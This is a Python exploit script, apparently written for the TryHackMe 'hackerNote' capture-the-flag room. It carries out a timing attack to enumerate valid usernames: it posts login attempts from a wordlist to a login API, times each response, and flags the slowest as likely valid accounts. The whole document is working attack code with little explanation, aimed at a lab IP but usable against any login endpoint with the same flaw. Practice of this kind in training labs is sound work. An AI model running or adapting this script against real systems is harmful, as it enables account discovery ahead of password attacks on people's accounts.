# Timing attack exploit code for THM room hackerNote
# Dev-Date: 09-09-2021

import subprocess
import requests
import time
import os

subprocess.call('cls' if os.name == 'nt' else 'clear', shell=True)

# config
ip_address = '10.10.160.152' # change this to your box IP :)
wordlist = 'user_list.txt'



all_times = dict()
count = 0


username_list = []

""" add all usernames into a list """
for line in open(wordlist, "r"):
    username_list.append(line.replace("\n", ""))


def exploit(username):

    """ Exploit the purposely poorly written backend in tryhackme.com/room/hackernote >:)

    This script sends a POST request to the vulnerable endpoint /api/user/login
    with the post data being the login payload from your wordlist
    to be tested on the HackerNote HTTP server.

    
    """

    payload = {'username':username, 'password': 'invalidPassword!'}

    time.sleep(0.1) # prevent inaccurate results / DoS
    web_response = requests.post(f'http://{ip_address}/api/user/login', json=payload)


if __name__ == '__main__':
    print(f'\n\t\x1b[91mTHM HackerNote \x1b[97mexploit code\n\n\t\x1b[97m[\x1b[92m!\x1b[97m] grabbed \x1b[92m{len(username_list)}\x1b[97m usernames from \x1b[91m{wordlist}\x1b[97m\n')
    time.sleep(1)


    for username in username_list:
        count += 1

        start_time = time.time()

        exploit(username)

        end_time = time.time()
        
        all_times[username] = end_time - start_time
        print(f'\x1b[93m[~]\x1b[97m attempted user: \x1b[38;5;67m{username} \x1b[92m({count}/{len(username_list)})\x1b[97m')

high_time = max(all_times.values())
low_time = min(all_times.values())
print(f'\n\x1b[97m!!!\tDELTA TIMING: \x1b[38;5;103m{high_time-low_time}\x1b[97m\t!!!\n')


for user, time in all_times.items():
    if time >= high_time * 0.9:
        # with 10% time tolerence
        print(f'\x1b[92m[+] \x1b[97mLikely Valid Accounts: {user}')

print('\n')
